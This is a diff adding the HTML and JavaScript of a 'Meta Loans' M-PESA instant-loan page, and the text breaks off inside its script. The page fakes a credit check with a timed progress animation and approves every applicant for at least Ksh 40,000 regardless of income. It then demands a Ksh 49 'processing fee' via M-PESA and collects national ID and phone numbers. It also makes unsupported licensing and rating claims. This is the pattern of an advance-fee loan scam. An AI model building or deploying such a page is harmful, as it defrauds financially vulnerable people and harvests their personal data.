@@ -1,0 +1,747 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <title>Meta Loans | Official Digital Lender - Instant M-PESA Loans</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #f5f7fc 0%, #eef2f8 100%);
+            color: #1a2c3e;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 1.5rem;
+            padding-top: 100px;
+        }
+        .navbar {
+            background: rgba(255,255,255,0.98);
+            backdrop-filter: blur(10px);
+            border-radius: 80px;
+            padding: 0.75rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.03);
+            border: 1px solid rgba(0,102,255,0.1);
+            position: fixed;
+            top: 1.5rem;
+            left: 50%;
+            transform: translateX(-50%);
+            width: calc(100% - 3rem);
+            max-width: 1200px;
+            z-index: 1000;
+            transition: all 0.3s ease;
+        }
+        .fab-apply {
+            position: fixed;
+            bottom: 2rem;
+            right: 2rem;
+            background: linear-gradient(135deg, #0066FF, #0052CC);
+            color: white;
+            border: none;
+            padding: 1rem 1.8rem;
+            border-radius: 60px;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 8px 24px rgba(0,102,255,0.4);
+            transition: all 0.3s ease;
+            z-index: 1100;
+            font-family: 'Inter', sans-serif;
+            backdrop-filter: blur(4px);
+        }
+        .fab-apply:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 28px rgba(0,102,255,0.5);
+            background: linear-gradient(135deg, #0052CC, #0040B0);
+        }
+        .fab-apply svg {
+            width: 20px;
+            height: 20px;
+        }
+        .fab-apply.hide-fab {
+            display: none;
+        }
+        @media (max-width: 768px) {
+            .container {
+                padding-top: 90px;
+            }
+            .navbar {
+                top: 1rem;
+                width: calc(100% - 2rem);
+                padding: 0.5rem 1rem;
+            }
+            .fab-apply {
+                bottom: 1.5rem;
+                right: 1.5rem;
+                padding: 0.8rem 1.4rem;
+                font-size: 0.9rem;
+            }
+        }
+        .card {
+            background: #ffffff;
+            border-radius: 32px;
+            padding: 2rem;
+            margin-bottom: 1.5rem;
+            box-shadow: 0 20px 35px -12px rgba(0,0,0,0.05);
+            border: 1px solid rgba(0,0,0,0.04);
+        }
+        .section-title {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #0a2540;
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .section-title::before {
+            content: '';
+            width: 4px;
+            height: 28px;
+            background: linear-gradient(135deg, #0066FF, #00C2FF);
+            border-radius: 4px;
+        }
+        .form-group {
+            margin-bottom: 1.25rem;
+        }
+        label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 500;
+            margin-bottom: 0.5rem;
+            color: #2c3e50;
+        }
+        input, select {
+            width: 100%;
+            padding: 0.9rem 1rem;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 20px;
+            font-family: 'Inter', sans-serif;
+            font-size: 0.95rem;
+            transition: all 0.2s;
+            background: #fefefe;
+        }
+        input:focus, select:focus {
+            outline: none;
+            border-color: #0066FF;
+            box-shadow: 0 0 0 3px rgba(0,102,255,0.1);
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #0066FF, #0052CC);
+            color: white;
+            border: none;
+            padding: 1rem 1.5rem;
+            border-radius: 40px;
+            font-weight: 700;
+            font-size: 1rem;
+            width: 100%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.2s;
+        }
+        .btn-primary:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 8px 20px rgba(0,102,255,0.3);
+        }
+        .btn-outline {
+            background: transparent;
+            border: 1.5px solid #0066FF;
+            color: #0066FF;
+        }
+        .btn-outline:hover {
+            background: rgba(0,102,255,0.05);
+        }
+        .trust-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1.25rem;
+            margin: 1.5rem 0;
+        }
+        .trust-card {
+            background: linear-gradient(135deg, #f8fafd, #ffffff);
+            border-radius: 24px;
+            padding: 1.25rem;
+            text-align: center;
+            border: 1px solid #eef2f8;
+            transition: all 0.2s;
+        }
+        .trust-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+        }
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(12px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+        }
+        .overlay-card {
+            background: white;
+            max-width: 480px;
+            width: 90%;
+            padding: 2rem;
+            border-radius: 48px;
+            text-align: center;
+            box-shadow: 0 40px 60px rgba(0,0,0,0.25);
+            animation: fadeInUp 0.35s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .overlay-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #0066FF, #00C2FF, #0066FF);
+        }
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .payment-icon-wrapper {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 1.25rem;
+            background: linear-gradient(135deg, #e8f0fe, #d4e4fc);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .fee-breakdown {
+            background: linear-gradient(135deg, #f8fafd, #f0f4f9);
+            border-radius: 28px;
+            padding: 1.25rem;
+            margin: 1.25rem 0;
+            text-align: left;
+        }
+        .fee-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 0.6rem 0;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        .fee-row:last-child {
+            border-bottom: none;
+            font-weight: 700;
+            color: #0066FF;
+        }
+        .mpesa-input-group {
+            background: #f8fafd;
+            border-radius: 32px;
+            padding: 0.2rem;
+            display: flex;
+            align-items: center;
+            border: 1.5px solid #e2e8f0;
+            transition: all 0.2s;
+            margin-top: 0.5rem;
+        }
+        .mpesa-input-group:focus-within {
+            border-color: #0066FF;
+            box-shadow: 0 0 0 3px rgba(0,102,255,0.1);
+        }
+        .mpesa-prefix {
+            padding: 0 1rem;
+            font-weight: 600;
+            color: #0066FF;
+            background: #eef4ff;
+            height: 52px;
+            display: flex;
+            align-items: center;
+            border-radius: 28px 0 0 28px;
+        }
+        .mpesa-input-group input {
+            border: none;
+            background: transparent;
+            padding: 0.9rem 0.5rem;
+            flex: 1;
+        }
+        .mpesa-input-group input:focus {
+            box-shadow: none;
+        }
+        .spinner {
+            width: 56px;
+            height: 56px;
+            margin: 0 auto 1.5rem;
+            border: 3px solid #e2e8f0;
+            border-top-color: #0066FF;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        .small-spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #e2e8f0;
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            display: inline-block;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .progress-bar {
+            height: 6px;
+            background: #e2e8f0;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-top: 1rem;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #0066FF, #00C2FF);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 10px;
+        }
+        .loan-amount-highlight {
+            font-size: 2.2rem;
+            font-weight: 800;
+            color: #0066FF;
+            margin: 0.5rem 0;
+        }
+        .repay-preview {
+            background: linear-gradient(135deg, #f0f7ff, #e8f0fe);
+            border-radius: 24px;
+            padding: 1rem;
+            margin-top: 1rem;
+        }
+        .hidden {
+            display: none !important;
+        }
+        .summary-container {
+            background: white;
+            border-radius: 32px;
+            padding: 2rem;
+            max-width: 700px;
+            margin: 0 auto;
+            box-shadow: 0 20px 35px -12px rgba(0,0,0,0.05);
+        }
+        .summary-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 0.75rem 0;
+            border-bottom: 1px solid #eef2f8;
+        }
+        .badge {
+            background: #e8f0fe;
+            color: #0066FF;
+            padding: 0.25rem 0.75rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+        }
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #e6f7ec;
+            color: #0e6245;
+            padding: 0.5rem 1rem;
+            border-radius: 40px;
+            font-size: 0.8rem;
+            font-weight: 500;
+        }
+        footer {
+            text-align: center;
+            margin-top: 2rem;
+            padding: 1rem;
+            color: #6c7a8a;
+            font-size: 0.8rem;
+        }
+        @media (max-width: 768px) {
+            .container { padding: 1rem; padding-top: 90px; }
+            .card { padding: 1.25rem; }
+            .trust-grid { grid-template-columns: 1fr 1fr; }
+            .overlay-card { padding: 1.5rem; }
+        }
+        .repayment-option {
+            display: flex;
+            gap: 1rem;
+            margin-top: 0.5rem;
+        }
+        .repay-radio {
+            flex: 1;
+            background: #f8fafd;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 28px;
+            padding: 0.8rem;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .repay-radio.selected {
+            border-color: #0066FF;
+            background: #eef4ff;
+            color: #0066FF;
+            font-weight: 600;
+        }
+        .repay-radio input {
+            display: none;
+        }
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .feature-card {
+            background: linear-gradient(135deg, #ffffff, #fefefe);
+            border-radius: 28px;
+            padding: 1.5rem;
+            border: 1px solid rgba(0,102,255,0.08);
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.02);
+        }
+        .feature-card:hover {
+            transform: translateY(-4px);
+            border-color: rgba(0,102,255,0.2);
+            box-shadow: 0 20px 30px -12px rgba(0,102,255,0.12);
+        }
+        .feature-icon {
+            width: 56px;
+            height: 56px;
+            background: linear-gradient(135deg, #eef4ff, #e0ecfe);
+            border-radius: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 1.25rem;
+        }
+        .feature-card h3 {
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: #0a2540;
+            margin-bottom: 0.5rem;
+        }
+        .feature-card p {
+            color: #5a6e7c;
+            font-size: 0.9rem;
+            line-height: 1.4;
+        }
+        .hero-text {
+            font-size: 1.05rem;
+            color: #4a5b6e;
+            margin-bottom: 1rem;
+            line-height: 1.5;
+        }
+        .nav-btn {
+            background: transparent;
+            border: none;
+            padding: 0.6rem 1.5rem;
+            border-radius: 40px;
+            font-weight: 600;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            transition: all 0.2s;
+            color: #4a5b6e;
+        }
+        .nav-btn.active {
+            background: #0066FF;
+            color: white;
+            box-shadow: 0 4px 12px rgba(0,102,255,0.3);
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="navbar">
+        <div class="logo">
+            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2L2 7L12 12L22 7L12 2Z" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="white"/>
+                <path d="M2 17L12 22L22 17" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+                <path d="M2 12L12 17L22 12" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+            </svg>
+            Meta Loans
+        </div>
+        <div class="nav-links">
+            <button class="nav-btn active" data-page="home">Home</button>
+            <button class="nav-btn" data-page="apply">Apply Now</button>
+        </div>
+    </div>
+    <button class="fab-apply hide-fab" id="fabApplyBtn">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M5 12H19M19 12L13 6M19 12L13 18" stroke="white" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        Apply Now
+    </button>
+    <div id="homePage">
+        <div class="card">
+            <div class="section-title">Instant Digital Loans</div>
+            <p class="hero-text">Get approved in minutes. Funds sent directly to your M-PESA. No paperwork, no hassle.</p>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M12 2L15 8.5L22 9.5L17 14L18.5 21L12 17.5L5.5 21L7 14L2 9.5L9 8.5L12 2Z" fill="#0066FF" stroke="#0066FF" stroke-width="1" stroke-linejoin="round"/>
+                        </svg>
+                    </div>
+                    <h3>Fast approval</h3>
+                    <p>Get a decision in under 2 minutes with our automated credit scoring system.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M3 12H21M12 3V21M7.5 7.5L16.5 16.5M7.5 16.5L16.5 7.5" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round"/>
+                            <circle cx="12" cy="12" r="9" stroke="#0066FF" stroke-width="1.5"/>
+                        </svg>
+                    </div>
+                    <h3>Competitive rates</h3>
+                    <p>8% flat interest with no hidden charges. What you see is what you pay.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M20 12.5C20 16.5 16.5 20 12.5 20H12C7.5 20 4 16.5 4 12C4 7.5 7.5 4 12 4C14.5 4 16.5 5 18 7" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round"/>
+                            <path d="M12 8V12L15 15" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round"/>
+                            <circle cx="12" cy="12" r="9" stroke="#0066FF" stroke-width="1.5"/>
+                        </svg>
+                    </div>
+                    <h3>Flexible repayment</h3>
+                    <p>Choose between 12 or 24 months to match your financial comfort.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <rect x="3" y="11" width="18" height="11" rx="2" stroke="#0066FF" stroke-width="1.5"/>
+                            <path d="M7 11V7C7 4 9 2 12 2C15 2 17 4 17 7V11" stroke="#0066FF" stroke-width="1.5"/>
+                            <circle cx="12" cy="16" r="1.5" fill="#0066FF"/>
+                        </svg>
+                    </div>
+                    <h3>Zero collateral</h3>
+                    <p>Unsecured loans based on your creditworthiness. No assets required.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round"/>
+                            <path d="M12 8V12L15 15" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round"/>
+                            <circle cx="12" cy="12" r="9" stroke="#0066FF" stroke-width="1.5"/>
+                            <path d="M19 3L22 6L19 9" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round"/>
+                            <path d="M16 6H22" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round"/>
+                        </svg>
+                    </div>
+                    <h3>24/7 customer support</h3>
+                    <p>Live chat and phone support whenever you need assistance.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M12 2L2 7L12 12L22 7L12 2Z" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                            <path d="M2 17L12 22L22 17" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                            <path d="M2 12L12 17L22 12" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                    </div>
+                    <h3>CRB approved</h3>
+                    <p>Fully licensed digital credit provider with transparent credit reporting.</p>
+                </div>
+            </div>
+            <div class="trust-grid">
+                <div class="trust-card">
+                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin: 0 auto 10px;">
+                        <path d="M12 2L15 8.5L22 9.5L17 14L18.5 21L12 17.5L5.5 21L7 14L2 9.5L9 8.5L12 2Z" fill="#0066FF" stroke="#0066FF" stroke-width="1" stroke-linejoin="round"/>
+                    </svg>
+                    <strong>CRB Verified</strong>
+                    <p style="font-size: 0.8rem; color: #6c7a8a;">Transparent credit scoring</p>
+                </div>
+                <div class="trust-card">
+                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin: 0 auto 10px;">
+                        <path d="M20 12.5C20 16.5 16.5 20 12.5 20H12C7.5 20 4 16.5 4 12C4 7.5 7.5 4 12 4C14.5 4 16.5 5 18 7" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round"/>
+                        <path d="M12 8V12L15 15" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round"/>
+                        <circle cx="12" cy="12" r="9" stroke="#0066FF" stroke-width="1.5"/>
+                    </svg>
+                    <strong>5 Min Disbursal</strong>
+                    <p style="font-size: 0.8rem; color: #6c7a8a;">After payment confirmation</p>
+                </div>
+                <div class="trust-card">
+                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin: 0 auto 10px;">
+                        <rect x="3" y="11" width="18" height="11" rx="2" stroke="#0066FF" stroke-width="1.5"/>
+                        <path d="M7 11V7C7 4 9 2 12 2C15 2 17 4 17 7V11" stroke="#0066FF" stroke-width="1.5"/>
+                        <circle cx="12" cy="16" r="1.5" fill="#0066FF"/>
+                    </svg>
+                    <strong>SSL Secured</strong>
+                    <p style="font-size: 0.8rem; color: #6c7a8a;">Bank-grade encryption</p>
+                </div>
+                <div class="trust-card">
+                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin: 0 auto 10px;">
+                        <path d="M20 12C20 16.4 16.4 20 12 20C7.6 20 4 16.4 4 12C4 7.6 7.6 4 12 4" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round"/>
+                        <path d="M12 8V12L15 15" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round"/>
+                        <circle cx="12" cy="12" r="9" stroke="#0066FF" stroke-width="1.5"/>
+                        <path d="M19 3L22 6L19 9" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round"/>
+                        <path d="M16 6H22" stroke="#0066FF" stroke-width="1.5" stroke-linecap="round"/>
+                    </svg>
+                    <strong>24/7 Support</strong>
+                    <p style="font-size: 0.8rem; color: #6c7a8a;">Live chat & phone</p>
+                </div>
+            </div>
+            <div style="background: linear-gradient(135deg, #eef4ff, #e6f0ff); border-radius: 24px; padding: 1.25rem; margin: 1rem 0;">
+                <div style="display: flex; gap: 16px; flex-wrap: wrap; justify-content: space-between;">
+                    <div><span class="badge">Loan Amount</span><br><strong>Ksh 40,000 – 80,000</strong></div>
+                    <div><span class="badge">Interest Rate</span><br><strong>8% Flat</strong></div>
+                    <div><span class="badge">Repayment</span><br><strong>12 or 24 Months</strong></div>
+                </div>
+            </div>
+            <button class="btn-primary" id="homeStartBtn">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M5 12H19M19 12L13 6M19 12L13 18" stroke="white" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+                Start Your Application
+            </button>
+        </div>
+        <div class="card" style="text-align: center;">
+            <div style="display: flex; justify-content: center; gap: 24px; flex-wrap: wrap;">
+                <div><span style="font-weight: 800; color: #0066FF;">50,000+</span><br>Active Borrowers</div>
+                <div><span style="font-weight: 800; color: #0066FF;">4.9★</span><br>Trustpilot Rating</div>
+                <div><span style="font-weight: 800; color: #0066FF;">#1</span><br>Digital Lender Kenya</div>
+            </div>
+        </div>
+    </div>
+    <div id="applyPage" class="hidden">
+        <div class="card">
+            <div class="section-title">Loan Application</div>
+            <form id="applicationForm">
+                <div class="form-group"><label>Full Name</label><input type="text" id="fullName" placeholder="Enter your full name" required></div>
+                <div class="form-group"><label>ID Number</label><input type="text" id="idNumber" placeholder="National ID Number" required></div>
+                <div class="form-group"><label>M-PESA Phone Number</label><input type="tel" id="phoneNumber" placeholder="0712345678 or 254712345678" required></div>
+                <div class="form-group"><label>Employment Status</label><select id="employmentStatus"><option value="employed">Employed</option><option value="self-employed">Self Employed</option><option value="student">Student</option></select></div>
+                <div class="form-group"><label>Monthly Income (Ksh)</label><input type="number" id="monthlyIncome" placeholder="e.g., 45000" required></div>
+                <div class="form-group"><label>Existing Loans</label><select id="existingLoans"><option value="none">No existing loans</option><option value="below10k">Yes, less than 10k</option><option value="above10k">Yes, above 10k</option></select></div>
+                <button type="submit" class="btn-primary">Check Eligibility</button>
+            </form>
+        </div>
+    </div>
+    <div id="summaryPage" class="hidden"><div class="summary-container"><div class="section-title">Review Your Application</div><div id="summaryContent"></div><button id="finalSubmitBtn" class="btn-primary" style="margin-top:1.5rem;">Confirm & Submit Application</button><button id="editBackBtn" class="btn-primary btn-outline" style="margin-top:0.75rem;">← Edit Details</button></div></div>
+    <div id="loadingOverlay" class="overlay hidden"><div class="overlay-card"><div class="spinner"></div><h3>Validating Your Information</h3><p id="loadingStatus" style="margin-top:0.5rem;">Checking CRB status...</p><div class="progress-bar"><div id="progressFill" class="progress-fill"></div></div></div></div>
+    <div id="congratsOverlay" class="overlay hidden"><div class="overlay-card"><div class="payment-icon-wrapper"><svg width="44" height="44" viewBox="0 0 24 24"><path d="M20 6L9 17L4 12" stroke="#0066FF" stroke-width="2"/><circle cx="12" cy="12" r="9" stroke="#0066FF" stroke-width="1.5"/></svg></div><h2>Congratulations!</h2><p>Based on your profile, you qualify for</p><div class="loan-amount-highlight" id="maxLoanAmount">Ksh 0</div><p style="margin-bottom:1rem;">8% flat interest · Minimum Ksh 40,000</p><div class="form-group"><label>Choose Repayment Period</label><div class="repayment-option" id="repaymentSelector"><div class="repay-radio selected" data-months="12">12 Months</div><div class="repay-radio" data-months="24">24 Months</div></div></div><div id="monthlyPreview" class="repay-preview"><strong>Monthly Payment:</strong> <span id="monthlyAmount">Ksh 0</span></div><button id="confirmLoanChoiceBtn" class="btn-primary" style="margin-top:1rem;">Continue Application</button></div></div>
+    <div id="confirmPaymentOverlay" class="overlay hidden"><div class="overlay-card"><div class="payment-icon-wrapper"><svg width="44" height="44" viewBox="0 0 24 24"><rect x="2" y="5" width="20" height="14" rx="2" stroke="#0066FF" stroke-width="1.5"/><path d="M7 12H17" stroke="#0066FF"/></svg></div><h3>Processing Fee</h3><div class="fee-breakdown"><div class="fee-row"><span>Loan Principal</span><strong id="feePrincipal">Ksh 0</strong></div><div class="fee-row"><span>Processing Fee</span><strong>Ksh 49</strong></div><div class="fee-row"><span>Total Due Today</span><strong>Ksh 49</strong></div></div><button id="payNowBtn" class="btn-primary">Pay Ksh 49 via M-PESA</button><button id="cancelPaymentBtn" class="btn-outline btn-primary" style="margin-top:0.75rem;">Cancel</button></div></div>
+    <div id="stkOverlay" class="overlay hidden"><div class="overlay-card"><div class="payment-icon-wrapper"><svg width="44" height="44" viewBox="0 0 24 24"><path d="M22 16.5V7.5C22 5.5 20.5 4 18.5 4H5.5C3.5 4 2 5.5 2 7.5V16.5C2 18.5 3.5 20 5.5 20H18.5C20.5 20 22 18.5 22 16.5Z" stroke="#0066FF"/><path d="M22 7L12 14L2 7" stroke="#0066FF"/></svg></div><h3>Meta Loans</h3><div class="form-group"><label>M-PESA Number</label><div class="mpesa-input-group"><span class="mpesa-prefix">+254</span><input type="tel" id="stkPhone"></div></div><div class="fee-breakdown"><div class="fee-row"><span>Amount to Pay</span><strong>Ksh 49</strong></div></div><button id="sendStkBtn" class="btn-primary">Pay Now Via M-pesa</button><div id="stkError" class="hidden" style="color:#d9534f;"></div><button id="cancelStkBtn" class="btn-outline btn-primary">Back</button></div></div>
+    <div id="waitingOverlay" class="overlay hidden"><div class="overlay-card"><div class="spinner"></div><h3>Waiting for Payment</h3><div id="timerDisplay">15 seconds remaining</div></div></div>
+    <div id="successOverlay" class="overlay hidden"><div class="overlay-card"><div class="payment-icon-wrapper"><svg width="44" height="44" viewBox="0 0 24 24"><path d="M20 6L9 17L4 12" stroke="#0e6245" stroke-width="2"/><circle cx="12" cy="12" r="9" stroke="#0e6245"/></svg></div><h2 style="color:#0e6245;">Loan Disbursed!</h2><div id="successDetails"></div><button id="homeResetBtn" class="btn-primary">Back to Home</button></div></div>
+    <footer>Meta Loans — Licensed Digital Credit Provider | Terms Apply</footer>
+</div>
+<script>
+    const BACKEND_URL = "https://newpayment-byr6.vercel.app";
+    let pollTimer;
+    let appState = { name: '', id: '', phone: '', employment: '', income: 0, existing: '', maxLoan: 0, selectedLoan: 0, monthly: 0, tenureMonths: 12 };
+    function formatPhoneFlexible(phone) { let cleaned = phone.replace(/\D/g, ''); if (cleaned.length === 9 && cleaned.startsWith('7')) cleaned = '254' + cleaned; else if (cleaned.length === 10 && cleaned.startsWith('0')) cleaned = '254' + cleaned.slice(1); else if (cleaned.length === 12 && cleaned.startsWith('254')) cleaned = cleaned; else throw new Error('Invalid phone number. Use 0712345678 or 254712345678'); if (!cleaned.startsWith('254') || cleaned.length < 12) throw new Error('Please enter a valid Kenyan number'); return cleaned; }
+    function computeMax(income, existing) { let base = income < 10000 ? 5000 : income < 20000 ? 15000 : income < 40000 ? 40000 : income < 70000 ? 65000 : 80000; if (existing === 'above10k') base = Math.floor(base * 0.6); else if (existing === 'below10k') base = Math.floor(base * 0.85); let capped = Math.min(base, 80000); return Math.max(capped, 40000); }
+    function calcMonthly(loan, months) { return Math.ceil((loan + loan * 0.08) / months); }
+    function updateMonthlyPreview() { if (appState.maxLoan) { const monthly = calcMonthly(appState.maxLoan, appState.tenureMonths); document.getElementById('monthlyAmount').innerText = `Ksh ${monthly.toLocaleString()}`; } }
+    document.querySelectorAll('.repay-radio').forEach(div => { div.addEventListener('click', () => { document.querySelectorAll('.repay-radio').forEach(d => d.classList.remove('selected')); div.classList.add('selected'); appState.tenureMonths = parseInt(div.dataset.months); updateMonthlyPreview(); }); });
+    document.getElementById('applicationForm').addEventListener('submit', (e) => { e.preventDefault(); appState.name = document.getElementById('fullName').value.trim(); appState.id = document.getElementById('idNumber').value.trim(); let rawPhone = document.getElementById('phoneNumber').value.trim(); appState.employment = document.getElementById('employmentStatus').value; appState.income = parseFloat(document.getElementById('monthlyIncome').value); appState.existing = document.getElementById('existingLoans').value; if (!appState.name || !appState.id || !rawPhone || isNaN(appState.income)) { alert('Please fill all fields correctly'); return; } try { appState.phone = formatPhoneFlexible(rawPhone); } catch(err) { alert(err.message); return; } appState.maxLoan = computeMax(appState.income, appState.existing); const overlay = document.getElementById('loadingOverlay'); overlay.classList.remove('hidden'); let prog = 0, step = 0; const steps = ['Checking CRB status...', 'Verifying credit score...', 'Analyzing repayment capacity...', 'Finalizing eligibility...']; const interval = setInterval(() => { prog += 20; document.getElementById('progressFill').style.width = prog + '%'; if (step < steps.length) document.getElementById('loadingStatus').innerText = steps[step++]; if (prog >= 100) { clearInterval(interval); setTimeout(() => { overlay.classList.add('hidden'); document.getElementById('maxLoanAmount').innerText = `Ksh ${appState.maxLoan.toLocaleString()}`; appState.tenureMonths = 12; document.querySelectorAll('.repay-radio').forEach(d => d.classList.remove('selected')); document.querySelector('.repay-radio[data-months="12"]').classList.add('selected'); updateMonthlyPreview(); document.getElementById('congratsOverlay').classList.remove('hidden'); }, 300); } }, 400); });
+    document.getElementById('confirmLoanChoiceBtn').addEventListener('click', () => { appState.selectedLoan = appState.maxLoan; appState.monthly = calcMonthly(appState.selectedLoan, appState.tenureMonths); document.getElementById('congratsOverlay').classList.add('hidden'); document.getElementById('summaryContent').innerHTML = `<div class="summary-item"><span>Full Name</span><strong>${appState.name}</strong></div><div class="summary-item"><span>ID Number</span><strong>${appState.id}</strong></div><div class="summary-item"><span>M-PESA Number</span><strong>${appState.phone}</strong></div><div class="summary-item"><span>Employment</span><strong>${appState.employment === 'employed' ? 'Employed' : appState.employment === 'self-employed' ? 'Self Employed' : 'Student'}</strong></div><div class="summary-item"><span>Monthly Income</span><strong>Ksh ${appState.income.toLocaleString()}</strong></div><div class="summary-item"><span>Loan Amount</span><strong>Ksh ${appState.selectedLoan.toLocaleString()}</strong></div><div class="summary-item"><span>Repayment Period</span><strong>${appState.tenureMonths} Months</strong></div><div class="summary-item"><span>Monthly Payment</span><strong>Ksh ${appState.monthly.toLocaleString()} (${appState.tenureMonths} months, 8% interest)</strong></div><div class="summary-item"><span>Application Date</span><strong>${new Date().toLocaleDateString()}</strong></div>`; showPage('summaryPage'); });
+    function showPage(page) { 
+        document.getElementById('homePage').classList.add('hidden'); 
+        document.getElementById('applyPage').classList.add('hidden'); 
